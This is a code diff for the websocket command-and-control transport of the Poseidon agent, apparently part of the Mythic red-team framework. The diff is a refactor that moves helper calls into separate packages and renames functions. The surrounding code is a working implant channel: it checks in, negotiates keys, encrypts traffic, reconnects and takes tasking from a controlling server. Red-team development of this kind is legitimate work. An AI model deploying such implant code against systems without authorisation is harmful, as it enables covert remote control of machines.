@@ -10,6 +10,8 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
 	"math/rand"
 	"net/http"
 	"os"
@@ -165,7 +167,7 @@ func init() {
 		os.Exit(1)
 	}
 	profile.Killdate = killDateTime
-	AddAvailableProfile(&profile)
+	RegisterAvailableC2Profile(&profile)
 	go profile.CreateMessagesForEgressConnections()
 }
 func (c *C2Websockets) CheckForKillDate() {
@@ -201,7 +203,7 @@ func (c *C2Websockets) Start() {
 		}()
 		for {
 			if c.ShouldStop || c.TaskingType == TaskingTypePush {
-				PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling Start before checking in\n"))
+				utils.PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling Start before checking in\n"))
 				return
 			}
 			checkIn := c.CheckIn()
@@ -216,11 +218,11 @@ func (c *C2Websockets) Start() {
 		}
 		for {
 			if c.ShouldStop || c.TaskingType == TaskingTypePush {
-				PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling Start after checking in\n"))
+				utils.PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling Start after checking in\n"))
 				return
 			}
 			// loop through all task responses
-			message := CreateMythicPollMessage()
+			message := responses.CreateMythicPollMessage()
 			encResponse, _ := json.Marshal(message)
 			//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
 			// send a message out to Mythic
@@ -230,12 +232,12 @@ func (c *C2Websockets) Start() {
 				taskResp := structs.MythicMessageResponse{}
 				err := json.Unmarshal(resp, &taskResp)
 				if err != nil {
-					PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
+					utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
 					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 					continue
 				}
 				// async handle the response back
-				HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
+				responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
 			}
 			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 		}
@@ -262,9 +264,9 @@ func (c *C2Websockets) Stop() {
 		}
 
 	}
-	PrintDebug(fmt.Sprintf("issued stop to websocket\n"))
+	utils.PrintDebug(fmt.Sprintf("issued stop to websocket\n"))
 	<-c.stoppedChannel
-	PrintDebug(fmt.Sprintf("websocket fully stopped\n"))
+	utils.PrintDebug(fmt.Sprintf("websocket fully stopped\n"))
 }
 func (c *C2Websockets) UpdateConfig(parameter string, value string) {
 	changingConnectionParameter := false
@@ -316,7 +318,7 @@ func (c *C2Websockets) UpdateConfig(parameter string, value string) {
 		go c.Start()
 		if changingConnectionType {
 			// if we're changing between push/poll let mythic know to refresh
-			P2PConnectionMessageChannel <- structs.P2PConnectionMessage{
+			responses.P2PConnectionMessageChannel <- structs.P2PConnectionMessage{
 				Source:        GetMythicID(),
 				Destination:   GetMythicID(),
 				Action:        "remove",
@@ -340,7 +342,7 @@ func (c *C2Websockets) CreateMessagesForEgressConnections() {
 		msg := <-c.PushChannel
 		raw, err := json.Marshal(msg)
 		if err != nil {
-			PrintDebug(fmt.Sprintf("Failed to marshal message to Mythic: %v\n", err))
+			utils.PrintDebug(fmt.Sprintf("Failed to marshal message to Mythic: %v\n", err))
 			continue
 		}
 		//fmt.Printf("Sending message outbound to websocket: %v\n", msg)
@@ -404,19 +406,19 @@ func (c *C2Websockets) CheckIn() structs.CheckInMessageResponse {
 	checkin := CreateCheckinMessage()
 	checkinMsg, err := json.Marshal(checkin)
 	if err != nil {
-		PrintDebug(fmt.Sprintf("error trying to marshal checkin data\n"))
+		utils.PrintDebug(fmt.Sprintf("error trying to marshal checkin data\n"))
 	}
 	for {
 		if c.ShouldStop {
-			PrintDebug(fmt.Sprintf("got c.ShouldStop in checkin\n"))
+			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in checkin\n"))
 			return structs.CheckInMessageResponse{}
 		}
 		if c.ExchangingKeys {
 			//fmt.Printf("exchanging keys is true in Checkin\n")
 			for !c.NegotiateKey() {
-				PrintDebug(fmt.Sprintf("failed to negotiate key, trying again\n"))
+				utils.PrintDebug(fmt.Sprintf("failed to negotiate key, trying again\n"))
 				if c.ShouldStop {
-					PrintDebug(fmt.Sprintf("got c.ShouldStop while negotiateKey\n"))
+					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop while negotiateKey\n"))
 					return structs.CheckInMessageResponse{}
 				}
 			}
@@ -428,7 +430,7 @@ func (c *C2Websockets) CheckIn() structs.CheckInMessageResponse {
 		response := structs.CheckInMessageResponse{}
 		err := json.Unmarshal(resp, &response)
 		if err != nil {
-			PrintDebug(fmt.Sprintf("Error unmarshaling checkin response: %s", err.Error()))
+			utils.PrintDebug(fmt.Sprintf("Error unmarshaling checkin response: %s", err.Error()))
 			return structs.CheckInMessageResponse{Status: "failed"}
 		}
 
@@ -447,7 +449,7 @@ func (c *C2Websockets) CheckIn() structs.CheckInMessageResponse {
 func (c *C2Websockets) SendMessage(output []byte) []byte {
 	// since we're using a single websocket stream, only send one message at a time
 	if c.ShouldStop {
-		PrintDebug(fmt.Sprintf("got c.ShouldStop in sendMessage\n"))
+		utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in sendMessage\n"))
 		return nil
 	}
 	//fmt.Printf("sending to Mythic: %v\n", string(output))
@@ -462,7 +464,7 @@ func (c *C2Websockets) SendMessage(output []byte) []byte {
 	}
 }
 func (c *C2Websockets) NegotiateKey() bool {
-	sessionID := GenerateSessionID()
+	sessionID := utils.GenerateSessionID()
 	pub, priv := crypto.GenerateRSAKeyPair()
 	c.RsaPrivateKey = priv
 	//initMessage := structs.EKEInit{}
@@ -475,7 +477,7 @@ func (c *C2Websockets) NegotiateKey() bool {
 	raw, err := json.Marshal(initMessage)
 
 	if err != nil {
-		PrintDebug(fmt.Sprintf("Error marshaling data: %s", err.Error()))
+		utils.PrintDebug(fmt.Sprintf("Error marshaling data: %s", err.Error()))
 		return false
 	}
 	resp := c.SendMessage(raw)
@@ -487,7 +489,7 @@ func (c *C2Websockets) NegotiateKey() bool {
 
 	err = json.Unmarshal(resp, &sessionKeyResp)
 	if err != nil {
-		PrintDebug(fmt.Sprintf("Error unmarshaling RsaResponse %s", err.Error()))
+		utils.PrintDebug(fmt.Sprintf("Error unmarshaling RsaResponse %s", err.Error()))
 		return false
 	}
 
@@ -515,7 +517,7 @@ func (c *C2Websockets) FinishNegotiateKey(resp []byte) bool {
 
 	err := json.Unmarshal(resp, &sessionKeyResp)
 	if err != nil {
-		PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
+		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
 		return false
 	}
 	if len(sessionKeyResp.UUID) > 0 {
@@ -532,7 +534,7 @@ func (c *C2Websockets) FinishNegotiateKey(resp []byte) bool {
 }
 func (c *C2Websockets) reconnect() {
 	if c.ShouldStop {
-		PrintDebug(fmt.Sprintf("got c.ShouldStop in reconnect\n"))
+		utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in reconnect\n"))
 		return
 	}
 	c.ReconnectLock.Lock()
@@ -546,7 +548,7 @@ func (c *C2Websockets) reconnect() {
 			c.PushConn.Close()
 		}
 	} else {
-		PrintDebug(fmt.Sprintf("Unknown tasking type, returning"))
+		utils.PrintDebug(fmt.Sprintf("Unknown tasking type, returning"))
 		return
 	}
 
@@ -561,13 +563,13 @@ func (c *C2Websockets) reconnect() {
 	url := fmt.Sprintf("%s%s", c.BaseURL, c.Endpoint)
 	for true {
 		if c.ShouldStop {
-			PrintDebug(fmt.Sprintf("got c.ShouldStop in reconnect loop\n"))
+			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in reconnect loop\n"))
 			return
 		}
 
 		connection, _, err := websocketDialer.Dial(url, header)
 		if err != nil {
-			PrintDebug(fmt.Sprintf("Error connecting to server %s ", err.Error()))
+			utils.PrintDebug(fmt.Sprintf("Error connecting to server %s ", err.Error()))
 			if c.TaskingType == TaskingTypePush {
 				if c.ShouldStop {
 					return
@@ -581,7 +583,7 @@ func (c *C2Websockets) reconnect() {
 			}
 			continue
 		}
-		PrintDebug(fmt.Sprintf("Successfully reconnected to server: %s\n", c.TaskingType))
+		utils.PrintDebug(fmt.Sprintf("Successfully reconnected to server: %s\n", c.TaskingType))
 		IncrementFailedConnection(c.ProfileName())
 		if c.TaskingType == TaskingTypePoll {
 			c.PollConn = connection
@@ -624,17 +626,17 @@ func (c *C2Websockets) sendData(sendData []byte) []byte {
 			os.Exit(1)
 		}
 		if c.ShouldStop || c.TaskingType == TaskingTypePush {
-			PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
+			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
 			return []byte{}
 		}
 		//log.Printf("Sending message %+v\n", m)
 		err := c.PollConn.WriteJSON(m)
 		if c.ShouldStop || c.TaskingType == TaskingTypePush {
-			PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
+			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
 			return []byte{}
 		}
 		if err != nil {
-			PrintDebug(fmt.Sprintf("error reading from polling connection: %v", err))
+			utils.PrintDebug(fmt.Sprintf("error reading from polling connection: %v", err))
 			c.PollConn.Close()
 			c.PollConn = nil
 			continue
@@ -643,11 +645,11 @@ func (c *C2Websockets) sendData(sendData []byte) []byte {
 		resp := structs.Message{}
 		err = c.PollConn.ReadJSON(&resp)
 		if c.ShouldStop || c.TaskingType == TaskingTypePush {
-			PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
+			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
 			return []byte{}
 		}
 		if err != nil {
-			PrintDebug(fmt.Sprintf("Error trying to read message %v", err.Error()))
+			utils.PrintDebug(fmt.Sprintf("Error trying to read message %v", err.Error()))
 			c.PollConn.Close()
 			c.PollConn = nil
 			continue
@@ -656,20 +658,20 @@ func (c *C2Websockets) sendData(sendData []byte) []byte {
 		raw, err := base64.StdEncoding.DecodeString(resp.Data)
 		if err != nil {
 			if c.ShouldStop || c.TaskingType == TaskingTypePush {
-				PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
+				utils.PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
 				return []byte{}
 			}
-			PrintDebug(fmt.Sprintf("Error decoding base64 data: ", err.Error()))
+			utils.PrintDebug(fmt.Sprintf("Error decoding base64 data: ", err.Error()))
 			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 			continue
 		}
 
 		if len(raw) < 36 {
 			if c.ShouldStop || c.TaskingType == TaskingTypePush {
-				PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
+				utils.PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
 				return []byte{}
 			}
-			PrintDebug(fmt.Sprintf("length of data < 36"))
+			utils.PrintDebug(fmt.Sprintf("length of data < 36"))
 			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 			continue
 		}
@@ -682,7 +684,7 @@ func (c *C2Websockets) sendData(sendData []byte) []byte {
 			if len(encRaw) == 0 {
 				// means we failed to decrypt
 				if c.ShouldStop || c.TaskingType == TaskingTypePush {
-					PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
+					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
 					return []byte{}
 				}
 				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
@@ -701,7 +703,7 @@ func (c *C2Websockets) sendDataNoResponse(sendData []byte) {
 	}
 
 	m := structs.Message{}
-	PrintDebug(fmt.Sprintf("about to send data to Mythic from Websocket Push\n%v\n", string(sendData)))
+	utils.PrintDebug(fmt.Sprintf("about to send data to Mythic from Websocket Push\n%v\n", string(sendData)))
 	if len(c.Key) != 0 {
 		sendData = c.encryptMessage(sendData)
 	}
@@ -718,14 +720,14 @@ func (c *C2Websockets) sendDataNoResponse(sendData []byte) {
 			os.Exit(1)
 		}
 		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
-			PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Pushing sendDataNoResponse\n"))
+			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Pushing sendDataNoResponse\n"))
 
 			return
 		}
 		//log.Printf("Sending message \n")
 		err := c.PushConn.WriteJSON(m)
 		if err != nil {
-			PrintDebug(fmt.Sprintf("Error writing to push connection: %v", err))
+			utils.PrintDebug(fmt.Sprintf("Error writing to push connection: %v", err))
 			IncrementFailedConnection(c.ProfileName())
 			c.PushConn.Close()
 			time.Sleep(1 * time.Second)
@@ -757,7 +759,7 @@ func (c *C2Websockets) getData() {
 			return
 		}
 		if err != nil {
-			PrintDebug(fmt.Sprintf("Error trying to read message %v", err.Error()))
+			utils.PrintDebug(fmt.Sprintf("Error trying to read message %v", err.Error()))
 			IncrementFailedConnection(c.ProfileName())
 			c.reconnect()
 			time.Sleep(1 * time.Second)
@@ -769,7 +771,7 @@ func (c *C2Websockets) getData() {
 			return
 		}
 		if err != nil {
-			PrintDebug(fmt.Sprintf("Error decoding base64 data: %v", err.Error()))
+			utils.PrintDebug(fmt.Sprintf("Error decoding base64 data: %v", err.Error()))
 			IncrementFailedConnection(c.ProfileName())
 			c.reconnect()
 			time.Sleep(1 * time.Second)
@@ -779,7 +781,7 @@ func (c *C2Websockets) getData() {
 			return
 		}
 		if len(raw) < 36 {
-			PrintDebug(fmt.Sprintf("length of data < 36"))
+			utils.PrintDebug(fmt.Sprintf("length of data < 36"))
 			IncrementFailedConnection(c.ProfileName())
 			c.reconnect()
 			time.Sleep(1 * time.Second)
@@ -807,10 +809,10 @@ func (c *C2Websockets) getData() {
 			taskResp := structs.MythicMessageResponse{}
 			err = json.Unmarshal(encRaw, &taskResp)
 			if err != nil {
-				PrintDebug(fmt.Sprintf("Failed to unmarshal message into MythicResponse: %v\n", err))
+				utils.PrintDebug(fmt.Sprintf("Failed to unmarshal message into MythicResponse: %v\n", err))
 			}
 			//fmt.Printf("Raw message from mythic: %v\n", string(enc_raw))
-			HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
+			responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
 		} else {
 			if c.ExchangingKeys {
 				//fmt.Printf("exchanging keys is true in getData\n")
@@ -833,12 +835,12 @@ func (c *C2Websockets) getData() {
 					c.ExchangingKeys = false
 					// once we check in successfully with Push, attempt to get any missing Poll messages
 				} else {
-					PrintDebug(fmt.Sprintf("Failed to checkin, got a weird message: %s\n", string(encRaw)))
+					utils.PrintDebug(fmt.Sprintf("Failed to checkin, got a weird message: %s\n", string(encRaw)))
 				}
-				PrintDebug("adding missed poll messages to push messages")
-				missedMessages := CreateMythicPollMessage()
+				utils.PrintDebug("adding missed poll messages to push messages")
+				missedMessages := responses.CreateMythicPollMessage()
 				c.PushChannel <- *missedMessages
-				PrintDebug("added missed poll messages")
+				utils.PrintDebug("added missed poll messages")
 			}
 		}
 	}
